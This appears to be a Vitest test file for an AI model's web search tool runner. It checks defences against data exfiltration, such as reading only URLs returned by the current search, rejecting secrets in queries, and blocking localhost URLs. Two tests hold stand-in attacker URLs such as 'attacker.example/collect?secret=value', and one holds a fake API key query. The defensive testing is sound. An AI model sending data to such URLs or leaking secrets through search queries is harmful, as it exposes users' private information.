import { describe, expect, it, vi } from 'vitest';
import { createWebSearchExecutionSession } from './executionSession';
import { runWebSearchToolCall } from './toolRunner';
import type { WebSearchClient } from './client';
import type { WebSearchStatus } from './types';

const RESULT_URL = 'https://example.com/page';

function createClient(): WebSearchClient {
  return {
    webSearch: vi.fn(async (query) => ({
      query,
      results: [{
        title: 'Example',
        url: RESULT_URL,
        snippet: 'Example result',
        publishedAt: null,
        source: 'test',
        thumbnail: null,
      }],
    })),
    readWebPage: vi.fn(async (url) => ({
      title: 'Example',
      summary: '',
      siteName: 'example.com',
      finalUrl: url,
      content: 'Readable page content.',
      charCount: 22,
    })),
    readWebPages: vi.fn(async (urls: string[]) => urls.map((url: string) => ({
      url,
      ok: true,
      page: {
        title: 'Example',
        summary: '',
        siteName: 'example.com',
        finalUrl: url,
        content: 'Readable page content.',
        charCount: 22,
      },
    }))),
  };
}

describe('web search tool runner', () => {
  it('registers search results and emits bounded statuses', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    const statuses: WebSearchStatus[] = [];

    const content = await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'example' }),
    }, {
      client,
      session,
      onStatus: (status) => statuses.push(status),
    });

    expect(content).toContain(RESULT_URL);
    expect(statuses.map((status) => status.phase)).toEqual(['searching', 'results']);
  });

  it('reads an exact URL returned by the current search', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'example' }),
    }, { client, session });

    const content = await runWebSearchToolCall({
      name: 'read_web_page',
      arguments: JSON.stringify({ url: RESULT_URL }),
    }, { client, session });

    expect(client.readWebPage).toHaveBeenCalledWith(RESULT_URL, {
      contentLimit: 3000,
      retries: 0,
    });
    expect(content).toContain('Readable page content.');
  });

  it('rejects arbitrary public URLs that were not search results', async () => {
    const client = createClient();

    const content = await runWebSearchToolCall({
      name: 'read_web_page',
      arguments: JSON.stringify({ url: 'https://attacker.example/collect?secret=value' }),
    }, { client, session: createWebSearchExecutionSession() });

    expect(client.readWebPage).not.toHaveBeenCalled();
    expect(content).toContain('Only URLs returned by the current web search');
  });

  it('rejects new search calls after a page read begins', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'example' }),
    }, { client, session });
    await runWebSearchToolCall({
      name: 'read_web_page',
      arguments: JSON.stringify({ url: RESULT_URL }),
    }, { client, session });

    const content = await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'private conversation content' }),
    }, { client, session });

    expect(client.webSearch).toHaveBeenCalledTimes(1);
    expect(content).toContain('New searches are not allowed after page reading has started.');
  });

  it('rejects a mixed batch containing an unregistered URL', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'example' }),
    }, { client, session });

    const content = await runWebSearchToolCall({
      name: 'read_web_pages',
      arguments: JSON.stringify({ urls: [RESULT_URL, 'https://attacker.example/'] }),
    }, { client, session });

    expect(client.readWebPages).not.toHaveBeenCalled();
    expect(content).toContain('Only URLs returned by the current web search');
  });

  it('enforces the per-request search budget', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    for (const query of ['one', 'two', 'three']) {
      await runWebSearchToolCall({
        name: 'web_search',
        arguments: JSON.stringify({ query }),
      }, { client, session });
    }

    const content = await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'four' }),
    }, { client, session });

    expect(client.webSearch).toHaveBeenCalledTimes(3);
    expect(content).toContain('search request budget was exhausted');
  });

  it('rejects high-confidence secrets in model-generated search queries', async () => {
    const client = createClient();
    const content = await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'api_key=sk-example-secret-value-123456789' }),
    }, { client, session: createWebSearchExecutionSession() });

    expect(client.webSearch).not.toHaveBeenCalled();
    expect(content).toContain('Sensitive values cannot be sent to web search.');
  });

  it('filters unsafe result URLs before registering them', async () => {
    const client = createClient();
    vi.mocked(client.webSearch).mockResolvedValueOnce({
      query: 'unsafe',
      results: [{
        title: 'Local',
        url: 'http://127.0.0.1/private',
        snippet: '',
        publishedAt: null,
        source: null,
        thumbnail: null,
      }],
    });
    const session = createWebSearchExecutionSession();

    await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'unsafe' }),
    }, { client, session });
    const content = await runWebSearchToolCall({
      name: 'read_web_page',
      arguments: JSON.stringify({ url: 'http://127.0.0.1/private' }),
    }, { client, session });

    expect(client.readWebPage).not.toHaveBeenCalled();
    expect(content).toContain('Tool call arguments were invalid.');
  });

  it('propagates active request cancellation', async () => {
    const client = createClient();
    const controller = new AbortController();
    controller.abort();

    await expect(runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'cancelled' }),
    }, {
      client,
      session: createWebSearchExecutionSession(),
      signal: controller.signal,
    })).rejects.toMatchObject({ name: 'AbortError' });
  });

  it('reports quota exhaustion as a stable search status', async () => {
    const client = createClient();
    const statuses: WebSearchStatus[] = [];
    const error = Object.assign(new Error('WEB_SEARCH_QUOTA_EXHAUSTED'), {
      errorCode: 'web_search_monthly_quota_exceeded',
    });
    vi.mocked(client.webSearch).mockRejectedValueOnce(error);

    const content = await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'current information' }),
    }, {
      client,
      session: createWebSearchExecutionSession(),
      onStatus: (status) => statuses.push(status),
    });

    expect(content).toContain('The web search quota has been used.');
    expect(statuses.at(-1)).toMatchObject({
      phase: 'error',
      message: 'The web search quota has been used.',
    });
  });

  it('contains hostile page-read error fields inside a generic tool result', async () => {
    const client = createClient();
    const session = createWebSearchExecutionSession();
    await runWebSearchToolCall({
      name: 'web_search',
      arguments: JSON.stringify({ query: 'example' }),
    }, { client, session });
    const error = Object.defineProperties({}, {
      code: { get: () => { throw new Error('hostile code getter'); } },
      name: { get: () => { throw new Error('hostile name getter'); } },
    });
    vi.mocked(client.readWebPage).mockRejectedValueOnce(error);

    await expect(runWebSearchToolCall({
      name: 'read_web_page',
      arguments: JSON.stringify({ url: RESULT_URL }),
    }, { client, session })).resolves.toContain('Unable to read this page.');
  });
});
